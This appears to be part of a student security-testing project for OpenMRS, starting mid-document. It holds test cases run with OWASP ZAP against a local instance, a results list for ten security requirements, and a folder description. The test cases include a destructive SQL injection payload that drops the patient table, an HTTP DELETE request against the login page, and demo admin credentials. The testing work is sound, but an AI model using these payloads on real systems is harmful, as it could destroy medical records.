+ OpenMRS should recognize the erronous flow and correct it by defaulting it to a page other than the logout page and still log user in correctly.

### * Post-condition
OpenMRS should still be operating normally

### * Actual results

User was returned to the login page as if the login credential was not correct

### * NOTES:
n/a# Client Bypass -4- LOGIN PAGE DELETTE
### Priority : HIGH
### Test status : FAILED
`DESIGNER : TAM N NGUYEN` <br/>
`EXECUTED BY : TAM N NGUYEN` <br/>
`UPDATED ON : 20OCT17` <br/>
`EXECUTED ON : 20OCT17` <br/>

### * Description
#### Name of module : OpenMRS login
+ Page location : http://localhost:8081/openmrs-standalone/login.htm
+ Attack type : HTTP Method exploit
+ Attack value : DELETE http://localhost:8081/openmrs-standalone/login.htm HTTP/1.1
In this test, we will use the DELETE http method to try to delete the login page from the server.


### * Precondition
1. A local computer with administrator privilege
2. Java JRE installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unziped
4. OWASP ZAP Version 2.6.0 downloaded and installed

### * Dependencies
1. OpenMRS with demo database was loaded and runs normally
2. OWASP ZAP runs normally
3. OWASP Local Proxy was properly configured
4. Browser proxy setting was properly configured to be pointed to OWASP proxy

### * Test steps
1. Open up OpenMRS V. 2.6.0 Standalone. Make sure Tomcat Port is 8081 and MySQL port is 3316. A web page starting with localhost:8081 will be automatically opened upon successful start.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/portSettings.png)

2. Open Google Chrome. In the browser, type "http://localhost:8081/openmrs-standalone/login.htm" (without the double quotes) into the address bar and hit Enter
3. Go to the main Zap window, on the left side bar, in "Sites" tab, under "Sites" sub section, you will now see "http://localhost:8081". Expand that until you see "GET:login.htm". If you don't see it, please go to the Chrome browser and make sure the login page is loaded. If the page is not loaded, you need to double check the OpenMRS to make sure it runs properly. If the page is loaded, you need to make sure proxy settings on both OpenMRS and Google Chrome were configured properly.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sitesLoaded.png)

4. Go back to the Chrome and login with a pair of username/password (we use "admin" for username and "Admin123" for password), select "Pharmacy" section and click login. After successful login, you log out.
5. Repeat step 2 to 4 but with this URL "http://localhost:8081/openmrs-standalone/referenceapplication/login.page"

6. In zap window, if you see two important page staring with "POST:login.htm" and "POST:login.page" on the left panel (the "Sites" panel).

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sites.png)

7. Select "POST:login.htm(password, redirectURL,sessionLocation,username)" from the left panel and select the "Break..." and then click "Save" and do the same for the page starts with "POST:login.page" under "referenceapplication" folder. 
8. The "Break Points" tab in the bottom pane should look like this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/breakpoints-login.png)

9. We now get back to our browser. Go to "Settings" > "Clear browsing data". Choose "Clear the following items from the beginning of time", check all the boxes and click "Clear browsing data"
10. Close "Settings" tab, and refresh the OpenMRS login page. Type in username: admin, and password: Admin123, choose "Pharmacy" location and click "Login"
10. You will not be able to login right away and OWASP Zap proxy may issue you an alert saying it is interupting the request. In such case, you can acknowledge the alert. Your screen should look similar to this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/interup1.png)

11. In the HTML header, replace "POST" by "DELETE"

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/interup5.png)

12. Click the "play" button several more times until the browser finishes loading the page.


### * Expected results
+ OpenMRS should fail securely either by denying the request and redirect user to the login page again.
+ Error message (if any) should not reveal too much information about the system.
+ Login page should not be deleted

### * Post-condition
OpenMRS should still be operating normally

### * Actual results

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/httpMethodError.png)

Login page is still intacted (verified by visiting the login page)

### * NOTES:
A very detailed stack trace was given which is a violation of "Fail securely" principle. Defaulting user to a default location should be a good way to mitigate this bug.# Client Bypass -4- SQL INJECTION
### Priority : HIGH
### Test status : PASSED
`DESIGNER : TAM N NGUYEN` <br/>
`EXECUTED BY : TAM N NGUYEN` <br/>
`UPDATED ON : 20OCT17` <br/>
`EXECUTED ON : 20OCT17` <br/>

### * Description
#### Name of module : OpenMRS login
+ Page location : http://localhost:8081/openmrs-standalone/login.htm
+ Attack type : SQL Injection
+ Attack value : %3B%20drop%20table%20patient%20--
In this test, we will use SQL injection method to try to remove the Patient table in the data base.


### * Precondition
1. A local computer with administrator privilege
2. Java JRE installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unziped
4. OWASP ZAP Version 2.6.0 downloaded and installed

### * Dependencies
1. OpenMRS with demo database was loaded and runs normally
2. OWASP ZAP runs normally
3. OWASP Local Proxy was properly configured
4. Browser proxy setting was properly configured to be pointed to OWASP proxy

### * Test steps
1. Open up OpenMRS V. 2.6.0 Standalone. Make sure Tomcat Port is 8081 and MySQL port is 3316. A web page starting with localhost:8081 will be automatically opened upon successful start.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/portSettings.png)

2. Open Google Chrome. In the browser, type "http://localhost:8081/openmrs-standalone/login.htm" (without the double quotes) into the address bar and hit Enter
3. Go to the main Zap window, on the left side bar, in "Sites" tab, under "Sites" sub section, you will now see "http://localhost:8081". Expand that until you see "GET:login.htm". If you don't see it, please go to the Chrome browser and make sure the login page is loaded. If the page is not loaded, you need to double check the OpenMRS to make sure it runs properly. If the page is loaded, you need to make sure proxy settings on both OpenMRS and Google Chrome were configured properly.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sitesLoaded.png)

4. Go back to the Chrome and login with a pair of username/password (we use "admin" for username and "Admin123" for password), select "Pharmacy" section and click login. After successful login, you log out.
5. Repeat step 2 to 4 but with this URL "http://localhost:8081/openmrs-standalone/referenceapplication/login.page"

6. In zap window, if you see two important page staring with "POST:login.htm" and "POST:login.page" on the left panel (the "Sites" panel).

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sites.png)

7. Select "POST:login.htm(password, redirectURL,sessionLocation,username)" from the left panel and select the "Break..." and then click "Save" and do the same for the page starts with "POST:login.page" under "referenceapplication" folder. 
8. The "Break Points" tab in the bottom pane should look like this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/breakpoints-login.png)

9. We now get back to our browser. Go to "Settings" > "Clear browsing data". Choose "Clear the following items from the beginning of time", check all the boxes and click "Clear browsing data"
10. Close "Settings" tab, and refresh the OpenMRS login page. Type in username: admin, and password: Admin123, choose "Pharmacy" location and click "Login"
10. You will not be able to login right away and OWASP Zap proxy may issue you an alert saying it is interupting the request. In such case, you can acknowledge the alert. Your screen should look similar to this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/interup1.png)

11. In the HTML request, paste "%3B%20drop%20table%20patient%20--" right after "admin" as shown

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/interup6.png)

12. Click the "play" button several more times until the browser finishes loading the page.


### * Expected results
+ OpenMRS should fail securely either by denying the request and redirect user to the login page again.
+ Error message (if any) should not reveal too much information about the system.
+ Patient table should not be deleted

### * Post-condition
OpenMRS should still be operating normally

### * Actual results

+ System denied login and redirected user back to the login page with a standard "Invalid login" message.
+ Patient table is intact and verifiable by logging into the system as admin, find patient record, input "Smith" in the search box and 5 patient entries will show up.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/proof1.png)

### * NOTES:
n/a# Security Requirements
`DESIGNER : Zhuo Li` <br/>
`EXECUTED BY : Zhuo Li` <br/>
`UPDATED ON : 22OCT17` <br/>
`EXECUTED ON : 22OCT17` <br/>

### SecReq01
Module:Manage Service Types

Requirements: Prevent the sysadmin from register a new service type which is the same as existing one. If the sysadmin register a existing one, the system should not register and generator some warning message.

Result: Pass

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq01.PNG)

### SecReq02
Module:Manage Service Types

Requirements: Prevent or remind the sysadmin from register a new service type which can last a extremely long time, e.g. 100000 min. It is meaningless for such a long time. If the sysadmin register a service type which last extremely long, the system should either remind the sysadmin “Do you want to register a 100000 min duration service type?” or just prevent the sysadmin and remind him “ you can not register a so long duration service type.”

Result: Failed. The duration for 100000 min is created successfully.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq02.PNG)

### SecReq03
Module:Manage Service Types

Requirements: The admin must can not change some service type to some existing service type.If the admin try to change some different service type, the system should prevent this behavior and warn the admin.

Result: Pass

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq03.PNG)


### SecReq04
Module:Manage Service Types

Requirements: The system should recognize different service type by the duration. If the differences of the two service type is time duration, that should be ok. Thus the system should allow the admin to register such a service type.

Result: Failed There isn't a service type Dermatology and duration 20min. It should be created.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq04.PNG)

### SecReq05
Module:Manage Service Types

Requirements: The system should only give the previlege to the admin to delete the service types. Especially if someone else try to delete the service type, the logging file should write down who did this without the system's preventing.

Result: Failed. The system allowed a clerk to delte the service type and logging file write the operation as an admin did.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq0501.PNG)
![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq0502.PNG)

### SecReq06
Module:Register a patient

Requirement: The system should validate the input for every field of the text. Especially for testing whether the input is malicious. If a user registerd with name in url format, the system should generate error message. Because this could cause XML injections or XSS Scripts.

Result: Failed

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq06.PNG)

### SecReq07
Module: Register a patient

Requirement: The application should validate the birth of date of the patient. If the user provide a invalid date of birth, the system should prevent that and generate a warning message. This validation aims at to valid the patient's information to avoid fake information.

Result: Pass

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq07.PNG)

### SecReq08
Module: Register a patient

Requirement: The system should authenticate the user when editing and saving the patient information. 
If the user has the previlege to do such things, there should be some log file to trace what the user did. These information should include userid, operation and timestamp at least. Then the new or changed data should be saved into the database. If user has no privilege to save the data, he should be redirected to an error page stating the error.

Result: Pass

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq08.PNG)

### SecReq09
Module:Register a patient

Requirement: The system should authorize the user's previlege every time when a user want to access a webpage. Especially when a user copy the url and try to access the webpage. If the user has the previlege, it is ok. If not, which means the user belongs to lower level of previlege, the system should prevent the user from accessing the webpage and generate a error page message. E.g. If user belongs to a lower privilege level and attempts to access higher privilege pages, for e.g. http://localhost:8082/openmrs-standalone/registrationapp/registerPatient.page?appId=referenceapplication.registrationapp.registerPatient 
the user should be redirected to error page.

Result: Failed. The nurse does not have the privilege to register a patient.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq09.PNG)


### SecReq10
Module:Register a patient

Requirement: The system should recognize there is already a patient which is similar to the one which is currently registering. If there is a patient who has the same first name and family name, the system should generate a remind message to avoid duplicate registering. This can avoid to generate too much useless record in the database.

Result: Pass

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/SecReq10.PNG)

In this folder, there are:

1.  Abuse/Misuse Cases 
We develop an abuse case diagram for one of the modules of OpenMRS (TBD) which involves the creation of a use case diagram with which the abuse cases interact with. We consider the various types of malicious actors that would like to abuse the chosen module and what they would want to do.
For four (4) of the abuse cases in our diagram, we write a detailed abuse case description.

2.  Attack Trees and Protection Trees
We develop an attack tree and a protection tree for our targeted module. We also include information on the tools required for each step in both process (no tool required, etc.), and a projected cost for each attack/protection scheme. These are estimates based on citations, evidence, etc.

3.  Security Requirements
We develop 10 security requirements for OpenMRS spreading over several modules